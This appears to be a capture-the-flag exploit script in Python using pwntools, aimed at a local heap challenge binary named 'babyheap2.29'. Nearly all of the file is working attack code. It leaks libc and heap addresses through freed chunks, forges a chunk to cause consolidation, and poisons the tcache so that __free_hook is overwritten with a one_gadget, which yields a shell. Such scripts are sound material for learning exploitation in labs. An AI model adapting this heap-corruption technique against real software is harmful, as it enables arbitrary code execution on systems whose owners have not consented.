from pwn import *

r = process('./babyheap2.29')

c = lambda:r.recvuntil(':')
s = lambda x:r.send(str(x))
sl = lambda x:r.sendline(str(x))

def alloc(size):
	sl(1)
	c()
	sl(size)
	c()

def update(index,size,comment):
	sl(2)
	c()
	sl(index)
	c()
	sl(size)
	c()
	s(comment)
	c()

def delete(index):
	sl(3)
	c()
	sl(index)
	c()

def view(index):
	sl(4)
	c()
	sl(index)
	c()
	leak = r.recvline()
	c()
	return leak

for _ in range(9):
	alloc(0xf0)
alloc(0x28)	# 9
alloc(0xf0)	# 10

for i in range(9):
	delete(i)

for _ in range(8):
	alloc(0xf0)

leak = u64(view(7).split(':')[1][1:-1].ljust(8,'\x00'))
print 'leak', hex(leak)
libc = leak - 0x1e4e90
print 'libc', hex(libc)
heap = u64(view(0)[1:-1].ljust(8,'\x00')) - 0x7b0 + 0x50
print 'heap', hex(heap)
__free_hook = libc + 0x1e75a8
one_gadget = libc + 0x106ef8

alloc(0xf0)		# 8
alloc(0x28)		# 11
alloc(0xf0)		# 12

fc = ''
fc += p64(0x0)
fc += p64(0x121)
fc += p64(heap+0xcb0)*2

update(12,0x10,p64(heap+0xa60)*2)
update(9,0x28,'1'*0x20+p64(0x120))
update(8,len(fc),fc)

for i in range(7):
	delete(i)

# tcache free 11->9
delete(11)
delete(9)
# consolidate heap from &((index 8)+0x10) to &(index 10) 
delete(10)

alloc(0x110) # 0

# Overwrite tcache
update(0,0xf7,'A'*0xe0 + p64(0) + p64(0x31) + p64(__free_hook-8)[:-1])

alloc(0x20)
alloc(0x20)
# Overwrite __free_hook to one shot gadget.
update(2,0x10,p64(0)+p64(one_gadget))
sl(3)
c()
sl(12) # Get shell.

r.interactive()